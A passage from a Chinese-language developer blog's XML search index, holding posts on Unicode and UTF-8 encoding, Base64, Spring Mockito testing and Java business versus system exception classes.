<li><p><a href="https://wiki.postgresql.org/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E6%AF%94" rel="external nofollow noopener noreferrer" target="_blank">数据库对比_wiki</a></p>
</li>
<li><p><a href="https://github.com/postgres-cn/pgdoc-cn" rel="external nofollow noopener noreferrer" target="_blank">postgres-cn/pgdoc-cn</a></p>
</li>
<li><p><a href="http://blog.51yip.com/pgsql/1525.html" rel="external nofollow noopener noreferrer" target="_blank">postgresql 查看数据库,表,索引,表空间以及大小</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> base </category>
            
        </categories>
        
        
        <tags>
            
            <tag> postgresql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Unicode历史]]></title>
      <url>http://qsli.github.io/2016/09/26/character-encoding/</url>
      <content type="html"><![CDATA[<h2 id="Character-set-（字符集）"><a href="#Character-set-（字符集）" class="headerlink" title="Character set （字符集）"></a>Character set （字符集）</h2><p>简单的说，就是计算机只认<code>0</code>和<code>1</code>，于是在数据取出来的时候根据一个类似字典的东西，按照一定的规则将比特信息转换成对应的字符信息，这样人们才可以理解到底存储了什么。</p>
<h3 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h3><p><code>ASCII</code>（American Standard Code for Information Interchange） 编码是基于拉丁字母的一套编码系统。</p>
<p><code>ASCII</code>使用指定的<code>7</code> 位或<code>8</code> 位二进制数组合来表示<code>128</code> 或<code>256</code> 种可能的字符。</p>
<blockquote>
<p>ASCII的局限在于只能显示26个基本拉丁字母、阿拉伯数目字和英式标点符号，因此只能用于显示现代美国英语（而且在处理英语当中的外来词如naïve、café、élite等等时，所有重音符号都不得不去掉，即使这样做会违反拼写规则）。而EASCII虽然解决了部分西欧语言的显示问题，但对更多其他语言依然无能为力。因此现在的软件系统大多采用Unicode。</p>
</blockquote>
<p>后续有其扩展版本<code>EASCII</code>。这个扩展的版本虽然扩充了一些字符，增大了EASCII的表达能力，但是仍不能满足全球各个国家的需求。于是各个国家就自己搞了一套编码的规则，但是随着web的发展，越来越需要一套统一的编解码标准，于是Unicode应运而出。</p>
<h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><img src="/2016/09/26/character-encoding/Unicode_logo.jpg">
<blockquote>
<p>Unicode provides a unique number for every character,<br>no matter what the platform,<br>no matter what the program,<br>no matter what the language.</p>
</blockquote>
<p>定义：</p>
<blockquote>
<p>Unicode（中文：万国码、国际码、统一码、单一码）是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。</p>
</blockquote>
<h4 id="code-point"><a href="#code-point" class="headerlink" title="code point"></a><strong>code point</strong></h4><blockquote>
<p>In Unicode, a character is dened as the smallest component of a written language that has semantic value.<br>The number assigned to a character is called a <strong>code point</strong>. A code point is denoted by U+ following by a<br>hexadecimal number from 4 to 8 digits long. Most of the code points in use are 4 digits long. For example,<br><code>U+03C6</code> is the code point for the Greek character f.</p>
</blockquote>
<img src="/2016/09/26/character-encoding/unicode-layout.jpg">
<blockquote>
<p>在文字处理方面，统一码为每一个字符而非字形定义唯一的代码（即一个整数）。换句话说，统一码以一种抽象的方式（即数字）来处理字符，并将视觉上的演绎工作（例如字体大小、外观形状、字体形态、文体等）留给其他软件来处理，例如网页浏览器或是文字处理器。</p>
</blockquote>
<h4 id="Java中判断是否是中文字符"><a href="#Java中判断是否是中文字符" class="headerlink" title="Java中判断是否是中文字符"></a>Java中判断是否是中文字符</h4><blockquote>
<p>Java判断一个字符串是否有中文一般情况是利用Unicode编码(CJK统一汉字的编码区间：0x4e00–0x9fbb)的正则来做判断，但是其实这个区间来判断中文不是非常精确，因为有些中文的标点符号比如：，。等等是不能识别的。</p>
</blockquote>
<p>具体的参见参考中的<code>Java 完美判断中文字符</code></p>
<h4 id="遗留的问题"><a href="#遗留的问题" class="headerlink" title="遗留的问题"></a>遗留的问题</h4><blockquote>
<p>需要注意的是，Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。</p>
</blockquote>
<p>存储中存在的问题：</p>
<ol>
<li><p>如何区分Unicode和ASCII码？</p>
</li>
<li><p>如何存储能节省空间？</p>
</li>
</ol>
<blockquote>
<p>它们造成的结果是：</p>
</blockquote>
<blockquote>
<p>1）出现了Unicode的多种存储方式，也就是说有许多种不同的二进制格式，可以用来表示Unicode。</p>
</blockquote>
<blockquote>
<p>2）Unicode在很长一段时间内无法推广，直到互联网的出现。</p>
</blockquote>
<ul>
<li>CJK</li>
</ul>
<blockquote>
<p>Q: What does the term “CJK” mean?</p>
</blockquote>
<blockquote>
<p>A: It is a commonly used acronym for “Chinese, Japanese, and Korean”. The term “CJK character” generally refers to “Chinese characters”, or more specifically, the Chinese (= Han) ideographs used in the writing systems of the Chinese and Japanese languages, occasionally for Korean, and historically in Vietnam.</p>
</blockquote>
<h2 id="Character-encoding（字符编码）"><a href="#Character-encoding（字符编码）" class="headerlink" title="Character encoding（字符编码）"></a>Character encoding（字符编码）</h2><blockquote>
<p>字符编码（英语：Character encoding）、字集码是把字符集中的字符编码为指定集合中某一对象（例如：比特模式、自然数序列、8位组或者电脉冲），以便文本在计算机中存储和通过通信网络的传递。</p>
</blockquote>
<img src="/2016/09/26/character-encoding/relation.png">
<p><strong>code point</strong>:</p>
<blockquote>
<p>A code point is encoded as a sequence of integers (called code units), whose bit size depends upon the selected character encoding.</p>
</blockquote>
<table>
<thead>
<tr>
<th>Character Encoding</th>
<th>Code Unit</th>
<th>size</th>
<th>Encoded value</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>UTF-8</td>
<td>8-bit</td>
<td>0xF0 0x9D 0x84 0x9E</td>
<td>4 bytes.</td>
<td>A sequence of 4 code units each 8-bits in length</td>
</tr>
<tr>
<td>UTF-16</td>
<td>16-bit</td>
<td>0xD834 0xDD1E</td>
<td>4 bytes.</td>
<td>A sequence of 2 code units each 16-bits in length</td>
</tr>
<tr>
<td>UTF-32</td>
<td>32-bit</td>
<td>0x0001D11E</td>
<td>4 bytes.</td>
<td>A sequence of 1 code units each 32-bits in length</td>
</tr>
</tbody>
</table>
<h3 id="UTF-8编码"><a href="#UTF-8编码" class="headerlink" title="UTF-8编码"></a>UTF-8编码</h3><blockquote>
<p>互联网的普及，强烈要求出现一种统一的编码方式。<strong>UTF-8就是在互联网上使用最广的一种Unicode的实现方式。</strong>其他实现方式还包括UTF-16（字符用两个字节或四个字节表示）和UTF-32（字符用四个字节表示），不过在互联网上基本不用。重复一遍，这里的关系是，UTF-8是Unicode的实现方式之一。</p>
</blockquote>
<h4 id="8的含义"><a href="#8的含义" class="headerlink" title="8的含义"></a>8的含义</h4><blockquote>
<p>unicode在很长一段时间内无法推广，直到互联网的出现，为解决unicode如何在网络上传输的问题，于是面向传输的众多 <strong>UTF（UCS Transfer Format）标准出现了，顾名思义，UTF-8就是每次8个位传输数据，而UTF-16就是每次16个位。</strong>UTF-8就是在互联网上使用最广的一种unicode的实现方式，这是为传输而设计的编码，并使编码无国界，这样就可以显示全世界上所有文化的字符了。</p>
</blockquote>
<p><strong>Code Unit</strong>:</p>
<ul>
<li>UTF-8的8指的就是最小为8位一个单元，也即一字节为一个单元，UTF-8可以包含一个单元，二个单元，三个单元及四个单元，对应即是一，二，三及四字节。</li>
<li>UTF-16的16指的就是最小为16位一个单元，也即两字节为一个单元，UTF-16可以包含一个单元和两个单元，对应即是两个字节和四个字节。我们操作UTF-16时就是以它的一个单元为基本单位的。</li>
<li>同理，UTF-32以32位一个单元，它只包含这一种单元就够了，它的一单元自然也就是四字节了。</li>
</ul>
<h4 id="UTF-8和Unicode"><a href="#UTF-8和Unicode" class="headerlink" title="UTF-8和Unicode"></a>UTF-8和Unicode</h4><img src="/2016/09/26/character-encoding/encoding.png">
<blockquote>
<p>UTF-8最大的一个特点，就是它是一种变长的编码方式。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度，当字符在ASCII 码的范围时，就用一个字节表示，保留了ASCII字符一个字节的编码做为它的一部分，注意的是unicode一个中文字符占2个字节，而UTF-8一个中 文字符占3个字节）。从unicode到uft-8并不是直接的对应，而是要过一些算法和规则来转换。</p>
</blockquote>
<h4 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h4><blockquote>
<p>UTF-8的编码规则很简单，只有二条：</p>
</blockquote>
<blockquote>
<p>1）对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的。</p>
</blockquote>
<blockquote>
<p>2）对于n字节的符号（n&gt;1），<strong>第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10</strong>。剩下的没有提及的二进制位，全部为这个符号的unicode码。</p>
</blockquote>
<p>所以如果第一个字节是<code>0</code>开头的，那么就是兼容ASCII码的单字节字符；如果第一个字节是<code>1</code>开头的就是多字节字符，数一数前面有多少个<code>1</code>，就知道这个字符占了几个字节。</p>
<p>所以UTF-8编码后的二进制形式应该如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0xxxxxxx 1个byte</span><br><span class="line"></span><br><span class="line">110xxxxx 10xxxxxx 2个byte</span><br><span class="line"></span><br><span class="line">1110xxxx 10xxxxxx 10xxxxxx 3个byte</span><br><span class="line"></span><br><span class="line">11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 4个byte</span><br><span class="line"></span><br><span class="line">111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 5个byte</span><br><span class="line"></span><br><span class="line">111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 6个byte</span><br></pre></td></tr></table></figure>
<blockquote>
<p>The bytes <code>0xFE(11111110)</code> and <code>0xFF(11111111)</code> are never used in the UTF-8 encoding.</p>
</blockquote>
<p>这两个特殊的字节被用来标示是大端编码和小端编码</p>
<p>UTF-8编码的范围和Unicode对应的关系如下：</p>
<table>
<thead>
<tr>
<th>总比特数</th>
<th>Code Point占的位数</th>
<th>范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>7</td>
<td>00000000 - 0000007F</td>
</tr>
<tr>
<td>2</td>
<td>11</td>
<td>00000080 - 000007FF</td>
</tr>
<tr>
<td>3</td>
<td>16</td>
<td>00000800 - 0000FFFF</td>
</tr>
<tr>
<td>4</td>
<td>21</td>
<td>00001000 - 001FFFFF</td>
</tr>
<tr>
<td>5</td>
<td>26</td>
<td>00200000 - 03FFFFFF</td>
</tr>
<tr>
<td>6</td>
<td>31</td>
<td>04000000 - FFFFFFFF</td>
</tr>
</tbody>
</table>
<p>编码示例：</p>
<p><code>U+05E7</code> 使用<code>UTF-8</code>编码示例:</p>
<ol>
<li><p>查上表得知， <code>05E7</code>在 <code>0080 - 07FF</code> 范围内，总共占2个字节<br>应该是类似 <code>110xxxxx 10xxxxxx</code></p>
</li>
<li><p>将其写成二进制形式，<code>0000 0101 1110 0111</code></p>
</li>
<li><p>将数据替换上述的<code>x</code>，得到 <code>11010111 10100111 = 0xD7A7</code></p>
</li>
</ol>
<ul>
<li>字节序</li>
</ul>
<p>UTF-8最多使用6个byte表示一个字符，于是就存在一个字节序的问题。<br>字节序分为两种：</p>
<ol>
<li><strong>Little-Endian</strong>:<br>字节序低位在前  小尾 在操作系统上很常用，也是计算机系统上最常用的字节序</li>
<li><strong>Big-Endian</strong>: 字节序高位在前 大尾  也称为网络字节序</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">16进制数字0x12345678，little-endian的存储为:  0x78 0x56 0x34 0x12     地址依次为100, 101, 102, 103</span><br><span class="line"></span><br><span class="line">16进制数字0x12345678，big-endian的存储为:     0x12 0x34 0x56 0x78       地址依次为100, 101, 102, 103</span><br></pre></td></tr></table></figure>
<blockquote>
<p>“endian”这个词出自《格列佛游记》。小人国的内战就源于吃鸡蛋时是究竟从大头(Big-Endian)敲开还是从小头(Little-Endian)敲开，由此曾发生过六次叛乱，其中一个皇帝送了命，另一个丢了王位。</p>
</blockquote>
<ul>
<li>字节序用途<blockquote>
<p>Little-Endian最常用，大部分用户的操作系统（如windows, FreeBsd,Linux）是Little Endian的。</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>Big-Endian最常用在网络协议上，例如TCP/IP协议使用的是big endian. 操作系统上如MAC OS ,是Big Endian 的。<br>本质上说，Little Endian还是Big Endian与操作系统和芯片类型都有关系。PowerPC系列采用big endian方式存储数据，x86系列则采用little endian方式存储数据。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Big Endian</span><br><span class="line">   低地址                                           高地址</span><br><span class="line">   -----------------------------------------&gt;</span><br><span class="line">   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">   |     12     |      34    |     56      |     78    |</span><br><span class="line">   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line"></span><br><span class="line">Little Endian</span><br><span class="line">   低地址                                           高地址</span><br><span class="line">   -----------------------------------------&gt;</span><br><span class="line">   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">   |     78     |      56    |     34      |     12    |</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Unicode规范中定义，每一个文件的最前面分别加入一个表示编码顺序的字符，这个字符的名字叫做”零宽度非换行空格”（ZERO WIDTH NO-BREAK SPACE），用FEFF表示。这正好是两个字节，而且FF比FE大1。<br>如果一个文本文件的头两个字节是FE FF，就表示该文件采用大头方式；如果头两个字节是FF FE，就表示该文件采用小头方式。</p>
</blockquote>
<h2 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h2><p>展示就是软件相关的了， 不同的字体渲染出来的也不一样</p>
<img src="/2016/09/26/character-encoding/glyphs.png" title="Fonts map the same code point to different glyphs">
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="emoji"><a href="#emoji" class="headerlink" title="emoji"></a>emoji</h3><img src="/2016/09/26/character-encoding/emoji.jpg">
<p>emoji表情采用的是 Unicode编码，Emoji就是一种在Unicode位于<code>\u1F601-\u1F64F</code>区段的字符。这个显然超过了目前常用的UTF-8字符集的编码范围<code>\u0000-\uFFFF</code>。</p>
<p>使用utf8mb4编码便可以解决上述的问题</p>
<h3 id="宽字符"><a href="#宽字符" class="headerlink" title="宽字符"></a>宽字符</h3><p>宽字符（Wide character） 是程序设计的术语。它是一个抽象的术语（没有规定具体实现细节），用以表示比8位字符还宽的数据类型。它不同于Unicode。</p>
<p>wchar_t在ANSI/ISO C中是一个数据类型，且某些其它的编程语言也用它来表示宽字符。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ol>
<li><p><a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81" rel="external nofollow noopener noreferrer" target="_blank">字符编码</a></p>
</li>
<li><p><a href="https://github.com/acmerfight/insight_python/blob/master/Unicode_and_Character_Sets.md" rel="external nofollow noopener noreferrer" target="_blank">Unicode_and_Character_Sets.md</a></p>
</li>
<li><p><a href="http://www.compsci.hunter.cuny.edu/~sweiss/resources/Unicode.pdf" rel="external nofollow noopener noreferrer" target="_blank">Unicode and UTF-8</a></p>
</li>
<li><p><a href="http://www.micmiu.com/lang/java/java-check-chinese/" rel="external nofollow noopener noreferrer" target="_blank">Java 完美判断中文字符</a></p>
</li>
<li><p><a href="http://unicode.org/emoji/charts/full-emoji-list.html" rel="external nofollow noopener noreferrer" target="_blank">Full Emoji Data, v3.0</a></p>
</li>
<li><p><a href="http://www.tuicool.com/articles/aQBVny" rel="external nofollow noopener noreferrer" target="_blank">微信emoji表情编码</a></p>
</li>
<li><p><a href="http://blog.csdn.net/sunshine1314/article/details/2309655" rel="external nofollow noopener noreferrer" target="_blank">关于Big Endian 和 Little Endian</a></p>
</li>
<li><p><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html" rel="external nofollow noopener noreferrer" target="_blank">字符编码笔记：ASCII，Unicode和UTF-8</a></p>
</li>
<li><p><a href="https://my.oschina.net/goldenshaw/blog/310331" rel="external nofollow noopener noreferrer" target="_blank">字符集与编码（四）——Unicode - Just do 挨踢 - OSCHINA</a></p>
</li>
<li><p><a href="https://www.freecodecamp.org/news/a-beginner-friendly-guide-to-unicode-d6d45a903515/" rel="external nofollow noopener noreferrer" target="_blank">A Beginner-Friendly Guide to Unicode ?</a></p>
</li>
<li><p><a href="https://my.oschina.net/goldenshaw/blog/311848" rel="external nofollow noopener noreferrer" target="_blank">字符集与编码（五）——代码单元及length方法 - Just do 挨踢 - OSCHINA</a></p>
</li>
<li><p><a href="http://zuga.net/articles/text-code-point-vs-code-unit/" rel="external nofollow noopener noreferrer" target="_blank">Zuga.net | Text - Code point vs. code unit</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> base </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 编码 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Base64编码原理]]></title>
      <url>http://qsli.github.io/2016/09/26/base64/</url>
      <content type="html"><![CDATA[<h2 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h2><blockquote>
<p>Base64 is a group of similar binary-to-text encoding schemes that represent binary data in an ASCII string format by translating it into a radix-64 representation. The term Base64 originates from a specific MIME content transfer encoding<br>来自 <a href="https://en.wikipedia.org/wiki/Base64" rel="external nofollow noopener noreferrer" target="_blank">wikipedia</a></p>
</blockquote>
<p>说白了就是将二进制的数据转换成字符编码。Base64由大小写字母各26个，<code>0-9</code>的10个数字，加号<code>+</code><br>以及斜杠<code>/</code>，一共64个字符组成，另外还用<code>=</code>来用作后缀，总共涉及的字符达到65个。</p>
<blockquote>
<p>a）所有的二进制文件，都可以因此转化为可打印的文本编码，使用文本软件进行编辑；</p>
</blockquote>
<blockquote>
<p>b）能够对文本进行简单的加密。</p>
</blockquote>
<blockquote>
<p>来自 <a href="http://www.ruanyifeng.com/blog/2008/06/base64.html" rel="external nofollow noopener noreferrer" target="_blank">Base64笔记-阮一峰</a></p>
</blockquote>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><img src="/2016/09/26/base64/encoding.jpg">
<blockquote>
<p>转换的时候，将三个byte的数据，先后放入一个24bit的缓冲区中，先来的byte占高位。数据不足3byte的话，于缓冲器中剩下的bit用0补足。然后，每次取出6（因为26=64）个bit，按照其值选择ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/中的字符作为编码后的输出。不断进行，直到全部输入数据转换完成。</p>
</blockquote>
<blockquote>
<p><a href="https://zh.wikipedia.org/wiki/Base64" rel="external nofollow noopener noreferrer" target="_blank">https://zh.wikipedia.org/wiki/Base64</a></p>
</blockquote>
<p>如果要编码的字节数不能被3整除:</p>
<ol>
<li>先使用0字节值在末尾补足，使其能够被3整除</li>
<li>进行base64的编码</li>
<li><p>在编码后的base64文本后加上一个或两个’=’号，代表补足的字节数</p>
<img src="/2016/09/26/base64/encoding2.jpg">
</li>
</ol>
<p>  Base64字符串只可能最后出现一个或两个”=”，中间是不可能出现”=”的</p>
<h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><blockquote>
<p>Base64 主要不是加密，它主要的用途是把一些二进制数转成普通字符用于网络传输。由于一些二进制字符在传输协议中属于控制字符，不能直接传送需要转换一下。Base64编码就是把二进制字节序列转化为ASCII字符序列。一般增加1/3长度，而且也是不可读的。</p>
</blockquote>
<blockquote>
<p><a href="http://nieyong.github.io/wiki_web/BASE64%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8.html" rel="external nofollow noopener noreferrer" target="_blank">BASE64编码原理及应用</a></p>
</blockquote>
<blockquote>
<p>Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email、在XML中存储复杂数据。</p>
</blockquote>
<blockquote>
<p><a href="https://zh.wikipedia.org/wiki/Base64" rel="external nofollow noopener noreferrer" target="_blank">https://zh.wikipedia.org/wiki/Base64</a></p>
</blockquote>
<h2 id="python中简单使用"><a href="#python中简单使用" class="headerlink" title="python中简单使用"></a>python中简单使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>encoded = base64.b64encode(<span class="string">'hello world'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> encoded</span><br><span class="line">aGVsbG8gd29ybGQ=</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>data = base64.b64decode(encoded)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> data</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
<p><a href="https://docs.python.org/2/library/base64.html" rel="external nofollow noopener noreferrer" target="_blank">base64 — RFC 3548: Base16, Base32, Base64 Data Encodings</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><p><a href="http://www.ruanyifeng.com/blog/2008/06/base64.html" rel="external nofollow noopener noreferrer" target="_blank">Base64笔记_阮一峰</a></p>
</li>
<li><p><a href="https://en.wikipedia.org/wiki/Base64" rel="external nofollow noopener noreferrer" target="_blank">Base64_wiki</a></p>
</li>
<li><p><a href="http://nieyong.github.io/wiki_web/BASE64%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8.html" rel="external nofollow noopener noreferrer" target="_blank">BASE64编码原理及应用</a></p>
</li>
<li><p><a href="https://github.com/CharonChui/AndroidNote/blob/master/Java%E5%9F%BA%E7%A1%80/Base64%E5%8A%A0%E5%AF%86.md" rel="external nofollow noopener noreferrer" target="_blank">Base64加密</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> base </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 编码 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[spring 采用Mock的方式进行单元测试]]></title>
      <url>http://qsli.github.io/2016/09/25/spring-mockMvc/</url>
      <content type="html"><![CDATA[<h2 id="Spring-amp-Mockito"><a href="#Spring-amp-Mockito" class="headerlink" title="Spring &amp; Mockito"></a>Spring &amp; Mockito</h2><p>在Spring中，采用完全mock的方式进行单元测试，借助Mockito框架</p>
<script src="//gist.github.com/3ad39c82972ed66de3d5934f1cdcedaa.js"></script>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spring mvc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java中的异常处理]]></title>
      <url>http://qsli.github.io/2016/09/25/java-exception/</url>
      <content type="html"><![CDATA[<h2 id="异常的分类"><a href="#异常的分类" class="headerlink" title="异常的分类"></a>异常的分类</h2><ul>
<li>业务异常</li>
</ul>
<blockquote>
<p>处理业务的时候80%的时候是没问题的，但可能有20%的时候事情没<br>有按理想的方向发展。例如注册用户的时候，正常情况是注册成功，但<br>可能用户提交请求的时候，系统发现用户名已经被别人注册了，这是就<br>可以抛出一个UserAlreadyExistsException</p>
</blockquote>
<p>来自 <a href="https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md</a></p>
<p>业务异常一般是上层可以处理的，一般声明为<code>CheckedException</code>，强制上层进行捕获处理</p>
<p>业务异常定义示例摘自<a href="http://gaojiewyh.iteye.com/blog/1297746#bc2369985" rel="external nofollow noopener noreferrer" target="_blank">spring mvc 异常统一处理</a>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class BusinessException extends Exception &#123;  </span><br><span class="line">   </span><br><span class="line">    private static final long serialVersionUID = 1L;  </span><br><span class="line">   </span><br><span class="line">    public BusinessException() &#123;  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public BusinessException(String message) &#123;  </span><br><span class="line">        super(message);  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public BusinessException(Throwable cause) &#123;  </span><br><span class="line">        super(cause);  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    public BusinessException(String message, Throwable cause) &#123;  </span><br><span class="line">        super(message, cause);  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般是继承自<code>Exception</code>, 这样就成为<code>CheckedException</code>， 必须强制捕获</p>
<ul>
<li>逻辑异常</li>
</ul>
<blockquote>
<p>系统异常与具体业务流程没有直接的关系，例如编程错误导致的NullPointExcpetion，<br>还有环境问题，例如磁盘损坏或者网络连接不稳定造成了IOException。</p>
</blockquote>
<blockquote>
<p>来自  <a href="https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md</a></p>
</blockquote>
<p>系统异常一般是上层无法处理的，所以一般声明为<code>UncheckedException</code>，不强制用户捕获。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public class SystemException extends RuntimeException &#123;  </span><br><span class="line">   </span><br><span class="line">    private static final long serialVersionUID = 1L;  </span><br><span class="line">   </span><br><span class="line">    public SystemException() &#123;  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    /** </span><br><span class="line">     * @param message </span><br><span class="line">     */  </span><br><span class="line">    public SystemException(String message) &#123;  </span><br><span class="line">        super(message);  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    /** </span><br><span class="line">     * @param cause </span><br><span class="line">     */  </span><br><span class="line">    public SystemException(Throwable cause) &#123;  </span><br><span class="line">        super(cause);  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    /** </span><br><span class="line">     * @param message </span><br><span class="line">     * @param cause </span><br><span class="line">     */  </span><br><span class="line">    public SystemException(String message, Throwable cause) &#123;  </span><br><span class="line">        super(message, cause);  </span><br><span class="line">        // TODO Auto-generated constructor stub  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
